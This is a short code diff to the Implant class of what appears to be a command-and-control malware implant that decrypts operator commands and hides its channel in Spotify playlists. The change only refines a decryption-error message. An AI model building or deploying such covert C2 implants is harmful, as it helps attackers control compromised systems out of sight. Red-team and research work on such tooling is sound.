@@ -94,7 +94,12 @@ class Implant:
                 cmd_dict = proto.decode_message(payload, self.key)
                 msg = proto.C2Message.from_command_dict(cmd_dict)
             except Exception as err:
-                print(f"[!] Failed to decode seq={seq_num}: {err}")
+                err_str = str(err).lower()
+                if 'tag' in err_str or 'decrypt' in err_str or 'invalid' in err_str:
+                    print(f"[!] Decryption failed for seq={seq_num}: "
+                          f"encryption key mismatch with operator?")
+                else:
+                    print(f"[!] Failed to decode seq={seq_num}: {err}")
                 self.spotify.clean_c2_playlists(
                     proto.CHANNEL_CMD, self.key, seq=seq_num
                 )
